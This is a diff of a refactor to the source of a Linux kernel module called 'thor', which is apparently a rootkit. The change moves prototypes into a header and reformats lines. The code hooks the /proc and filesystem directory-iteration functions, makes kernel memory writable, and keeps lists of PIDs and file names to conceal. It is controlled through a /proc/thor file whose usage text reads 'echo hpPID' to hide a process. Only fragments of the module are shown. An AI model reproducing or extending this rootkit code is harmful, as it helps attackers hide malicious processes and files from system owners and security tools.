@@ -1,64 +1,30 @@
+#include "thor.h"
+
 #include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
-#include <linux/seq_file.h>
 #include <linux/ptrace.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 
 #include <fs/proc/internal.h>
 
 #include "logging.h"
 
-#define THOR_PROCFILE "thor"
-
-#define MIN(a,b) \
-   ({ typeof (a) _a = (a); \
-      typeof (b) _b = (b); \
-     _a < _b ? _a : _b; })
-
-// ------------------------------------------------------------ PROTOTYPES
-static int __init thor_init(void);
-static int __init procfile_init(void);
-static int __init prochidder_init(void);
-static int __init filehidder_init(void);
-static void prochidder_cleanup(void);
-static void filehidder_cleanup(void);
-static void __exit thor_exit(void);
-static void thor_cleanup(void);
-static int procfile_open(struct inode *inode, struct file *file);
-static int procfile_read(struct seq_file *m, void *v);
-static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
-static void procfile_cleanup(void);
-static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
-static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
-static int thor_fs_iterate(struct file *file, struct dir_context *ctx);
-static int thor_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
-static void add_to_pid_list(const char *name, unsigned int len);
-static void remove_from_pid_list(const char *name, unsigned int len);
-static void clear_pid_list(void);
-static void add_to_file_list(const char *name, unsigned int len);
-static void remove_from_file_list(const char *name, unsigned int len);
-static void clear_file_list(void);
-// ------------------------------------------------------------ DEFINITIONS
-struct _pid_list {
-    char *name;
-    struct list_head list;
-};
-struct _file_list {
-    char *name;
-    struct list_head list;
-};
 // ------------------------------------------------------------ GLOBALS
 static struct proc_dir_entry *procfile;
 static struct proc_dir_entry *procroot;
 static struct file_operations *proc_fops;
 static struct file_operations *fs_fops;
 static int (*orig_proc_iterate)(struct file *, struct dir_context *);
-static int (*orig_proc_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*orig_proc_filldir)(void *buf, const char *name, int namelen,
+        loff_t offset, u64 ino, unsigned d_type);
 static int (*orig_fs_iterate)(struct file *, struct dir_context *);
-static int (*orig_fs_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*orig_fs_filldir)(void *buf, const char *name, int namelen,
+        loff_t offset, u64 ino, unsigned d_type);
+
 static struct file_operations procfile_fops = {
     .owner = THIS_MODULE,
     .open = procfile_open,
@@ -67,8 +33,10 @@ static struct file_operations procfile_fops = {
     .llseek = seq_lseek,
     .release = single_release,
 };
+
 struct _pid_list pid_list;
 struct _file_list file_list;
+
 // ------------------------------------------------------------ HELPERS
 static void set_addr_rw(void *addr)
 {
@@ -153,7 +121,7 @@ static int __init filehidder_init(void)
 // ------------------------------------------------------------ PROCFILE
 static int procfile_read(struct seq_file *m, void *v)
 {
-    seq_printf(m, 
+    seq_printf(m,
         "usage:\n"\
         "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
         "   echo upPID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
@@ -221,7 +189,8 @@ static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
     return ret;
 }
 
-static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+static int thor_proc_filldir(void *buf, const char *name, int namelen,
+        loff_t offset, u64 ino, unsigned d_type)
 {
     struct _pid_list *tmp;
     // hide specified PIDs
@@ -348,6 +317,7 @@ static void clear_pid_list(void)
         kfree(tmp);
     }
 }
+
 // ------------------------------------------------------------ CLEANUP
 static void thor_cleanup(void)
 {
